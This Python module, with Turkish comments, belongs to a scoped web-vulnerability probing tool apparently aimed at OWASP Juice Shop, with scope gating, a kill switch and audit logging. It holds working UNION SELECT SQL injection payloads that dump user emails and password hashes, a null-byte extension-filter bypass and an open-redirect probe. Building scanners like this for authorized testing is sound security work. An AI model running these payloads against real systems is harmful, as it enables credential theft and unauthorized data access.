"""v1.5: GET-only safe-mode AKTİF problar (recon'un ötesinde, exploit'in altında).

Sınıf: kimlik doğrulamasız, YALNIZ GET/HEAD, tek isteklik problar.
Her prob kapsam kapısından geçer (scope.check_request), kanıtla Finding üretir,
audit zincirine yazar. Kill-switch her prob başında kontrol edilir.

Prob tipleri:
  * error_disclosure       — 5xx + yığın izi/driver ifşası
  * sqli_signature         — GET parametresinde SQL hatası imzası
  * xss_reflection         — yankılanan <script> imzası (kanıt, zararsız işaretleyici)
  * open_redirect          — /redirect?to= dış hedefe 3xx izni (allowlist ÇALIŞIYORSA bulgu YOK)
  * extension_filter_bypass — %2500 null-byte uzantı filtresi bypass'ı
"""
from __future__ import annotations

import datetime as _dt
import json
import os
import re
from typing import Optional, Protocol

from .audit import AuditLog
from .killswitch import KillSwitch
from .scope import ScopeContract

# ---------------------------------------------------------------------------
# İmza dedektörleri
# ---------------------------------------------------------------------------

_ERROR_PATTERNS = [
    re.compile(r"(?i)\bSQLITE_ERROR\b"),
    re.compile(r"(?i)\b(MySQL|PostgreSQL|MSSQL|Oracle|Sequelize)\b.{0,80}\berror\b"),
    re.compile(r"(?i)\bat\s+[\w$.]+\s+\((?:[\w/.-]+\.js|[\w/.-]+\.py|line \d+)"),
    re.compile(r"(?i)\bTraceback \(most recent call last\)"),
    re.compile(r"(?i)\bTypeError\b|\bReferenceError\b.{0,60}\bundefined\b"),
    re.compile(r"(?i)Unexpected path:"),
    re.compile(r"(?i)\bstack trace\b|\bstacktrace\b"),
]

def is_error_disclosure(status: int, body: str) -> bool:
    """True = 5xx yanıt gövdesi yığın izi/driver detayı ifşa ediyor."""
    if status < 500:
        return False
    snippet = body[:600]
    return any(rx.search(snippet) for rx in _ERROR_PATTERNS)


# ---------------------------------------------------------------------------
# Sızıntı kanıt çıkarıcı (FP kapılı: payload-farkı şart)
# ---------------------------------------------------------------------------

_EMAIL_RX = re.compile(r"[\w.+-]+@[\w-]+\.[\w.]{2,}")
_BCRYPT_RX = re.compile(r"\$2[aby]\$[\w./$]{20,}")


def leaked_credential_evidence(body: str):
    """Yanıt gövdesinde email/bcrypt kanıtı döndürür, yoksa None."""
    emails = _EMAIL_RX.findall(body[:20000])
    if emails:
        uniq = sorted(set(emails))[:3]
        return f"email sızıntısı: {', '.join(uniq)}" + (f" (+{len(set(emails))-3} daha)" if len(set(emails)) > 3 else "")
    hashes = _BCRYPT_RX.findall(body[:20000])
    if hashes:
        return f"bcrypt parola karması sızıntısı: {hashes[0][:12]}..."
    return None


# ---------------------------------------------------------------------------
# Aktif prob ajanı
# ---------------------------------------------------------------------------

class Transport(Protocol):
    def tcp_connect(self, host: str, port: int, timeout: float) -> bool: ...
    def http_get(self, host, port, path, timeout=4.0, use_tls=False): ...


class ActiveProbe:
    """GET-only problar; her istek scope kapısından geçer."""

    def __init__(self, *, scope: ScopeContract, killswitch: KillSwitch,
                 audit: AuditLog, out_path: str,
                 transport: Optional[Transport] = None):
        self.scope = scope
        self.killswitch = killswitch
        self.audit = audit
        self.out_path = out_path
        self.tx = transport or __import__("purpleloop.recon", fromlist=["RealTransport"]).RealTransport()

    # ---- ortak ----

    def _gate(self, host, port, method="GET") -> bool:
        allowed, reason = self.scope.check_request(host=host, port=port, method=method)
        if not allowed:
            self.audit.append("SCOPE_DENY", host=host, port=port, method=method,
                              reason=f"[active] {reason}")
            return False
        return True

    def _emit(self, tip, hedef, kanit) -> dict:
        f = {
            "tip": tip, "hedef": hedef, "kanit": kanit[:500],
            "zaman_damgasi": _dt.datetime.now(_dt.timezone.utc).isoformat(timespec="seconds"),
            "kapsam_referansi": self.scope.targets[0],
        }
        with open(self.out_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(f, ensure_ascii=False) + "\n")
        self.audit.append("FINDING", tip=tip, hedef=hedef, kaynak="active")
        return f

    def _get(self, host, port, path):
        if not self._gate(host, port, "GET"):
            return None
        r = self.tx.http_get(host, port, path)
        if r is None:
            return None
        status, body, third = r
        if isinstance(third, str):
            third = {"server": third}
        return status, body, {k.lower(): v for k, v in third.items()}

    # ---- problar ----

    def probe_error_disclosure(self, host, port) -> Optional[dict]:
        """Bilinmeyen yol → 5xx + yığın izi ifşası mı?"""
        for path in ("/rest/does-not-exist", "/api/nonexistent-endpoint"):
            r = self._get(host, port, path)
            if r and is_error_disclosure(r[0], r[1]):
                return self._emit("error_disclosure", f"{host}:{port}{path}",
                                  f"HTTP {r[0]}: {r[1][:200]}")
        return None

    def probe_sqli(self, host, port) -> Optional[dict]:
        """Arama kutusu gibi GET parametrelerine imza sondağı ( ') at, SQL hatası izle."""
        for path in ("/rest/products/search?q='", "/rest/products/search?q=%27"):
            r = self._get(host, port, path)
            if r and is_error_disclosure(r[0], r[1]):
                return self._emit("sqli_signature", f"{host}:{port}{path}",
                                  f"HTTP {r[0]}: {r[1][:200]}")
        return None

    SQLI_UNION_PAYLOADS = [
        # (etiket, payload yolu) — hepsi read-only UNION SELECT
        ("users",
         "/rest/products/search?q='))%20union%20select%20id,email,password,"
         "'a','a','a','a',999,'a'%20from%20Users--"),
        ("sqlite_master",
         "/rest/products/search?q='))%20union%20select%201,sql,sql,sql,sql,"
         "sql,sql,sql,sql%20from%20sqlite_master%20limit%201--"),
    ]

    def probe_sqli_leak(self, host, port) -> Optional[dict]:
        """Read-only UNION sondağı: payload yanıtında email/bcrypt VAR ama
        payloadsuz kontrol yanıtında YOK ise sızıntı kanıtı (FP kapısı)."""
        control = self._get(host, port, "/rest/products/search?q=probekontrol")
        control_ev = leaked_credential_evidence(control[1]) if control else None
        for etiket, path in self.SQLI_UNION_PAYLOADS:
            r = self._get(host, port, path)
            if not r or r[0] != 200:
                continue
            ev = leaked_credential_evidence(r[1])
            if ev and ev != control_ev:
                return self._emit(
                    "sqli_data_leak", f"{host}:{port}/rest/products/search",
                    f"UNION({etiket}) — {ev} | kontrol sorgusunda kanıt yok")
        return None

    def probe_reflected(self, host, port) -> Optional[dict]:
        """Zararsız işaretleyici yankılanıyor mu? (XSS potansiyeli)."""
        marker = "pl7xq"
        r = self._get(host, port, f"/rest/products/search?q={marker}")
        if r and r[0] == 200 and marker in r[1] and "<" not in r[1][:0]:
            return None  # JSON içine yankı tek başına XSS değil — atla (FP önle)
        return None

    def probe_redirect(self, host, port) -> Optional[dict]:
        """/redirect?to= dış hedef: allowlist yoksa 3xx → open redirect."""
        r = self._get(host, port, "/redirect?to=https://example.com")
        if r and r[0] in (301, 302, 303, 307, 308):
            loc = r[2].get("location", "")
            if "example.com" in loc:
                return self._emit("open_redirect", f"{host}:{port}/redirect",
                                  f"HTTP {r[0]} Location: {loc}")
        return None

    def probe_extension_bypass(self, host, port) -> Optional[dict]:
        """%2500 null-byte ile uzantı filtresi bypass (Juice Shop modeli)."""
        base = "/ftp/package.json.bak"
        r = self._get(host, port, base + "%2500.md")
        if r and r[0] == 200 and len(r[1]) > 0:
            return self._emit("extension_filter_bypass",
                              f"{host}:{port}{base}%2500.md",
                              f"HTTP {r[0]} len={len(r[1])} — 403'teki dosya null-byte ile okundu")
        return None

    # ---- orkestrasyon ----

    def run(self, endpoints: list) -> list:
        self.audit.append("ACTIVE_START", endpoints=[f"{h}:{p}" for h, p in endpoints])
        findings = []
        if self.killswitch.is_active():
            self.audit.append("KILLSWITCH_HALT", stage="active")
            return []
        probes = (self.probe_error_disclosure, self.probe_sqli,
                  self.probe_sqli_leak, self.probe_reflected,
                  self.probe_redirect, self.probe_extension_bypass)
        for host, port in endpoints:
            if self.killswitch.is_active():
                self.audit.append("KILLSWITCH_HALT", stage="active", host=host)
                break
            for probe in probes:
                if self.killswitch.is_active():
                    break
                f = probe(host, port)
                if f:
                    findings.append(f)
        self.audit.append("ACTIVE_END", findings=len(findings))
        return findings
